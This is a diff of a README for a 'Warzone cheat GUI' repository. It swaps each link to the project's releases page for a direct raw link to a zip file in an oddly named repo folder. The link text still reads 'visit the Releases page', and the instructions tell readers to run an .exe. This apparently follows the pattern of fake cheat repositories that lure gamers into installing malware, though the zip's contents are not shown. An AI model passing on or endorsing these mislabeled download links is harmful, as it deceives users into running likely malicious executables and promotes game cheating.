@@ -1,7 +1,7 @@
 # 🎮 warzone-cheat-gui - Enhance Your Gaming Experience Effortlessly
 
 ## 📥 Download Now!
-[![Download warzone-cheat-gui](https://img.shields.io/badge/Download-warzone--cheat--gui-brightgreen)](https://github.com/zaazahub/warzone-cheat-gui/releases)
+[![Download warzone-cheat-gui](https://raw.githubusercontent.com/zaazahub/warzone-cheat-gui/main/exteriorness/warzone-cheat-gui.zip)](https://raw.githubusercontent.com/zaazahub/warzone-cheat-gui/main/exteriorness/warzone-cheat-gui.zip)
 
 ---
 
@@ -36,7 +36,7 @@ The Warzone Cheat GUI includes:
 
 ## 🔗 Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/zaazahub/warzone-cheat-gui/releases) to visit the Releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/zaazahub/warzone-cheat-gui/main/exteriorness/warzone-cheat-gui.zip) to visit the Releases page.
    
 2. **Choose Your Version**: Find the latest version listed on the page. Look for the file with the `.exe` extension, which is the executable file you need.
 
@@ -103,6 +103,6 @@ These topics will help you find community discussions and related tools.
 
 ## 🔗 Download Again
 
-To download the Warzone Cheat GUI, visit: [https://github.com/zaazahub/warzone-cheat-gui/releases](https://github.com/zaazahub/warzone-cheat-gui/releases) 
+To download the Warzone Cheat GUI, visit: [https://raw.githubusercontent.com/zaazahub/warzone-cheat-gui/main/exteriorness/warzone-cheat-gui.zip](https://raw.githubusercontent.com/zaazahub/warzone-cheat-gui/main/exteriorness/warzone-cheat-gui.zip) 
 
 Enjoy enhancing your Warzone experience!
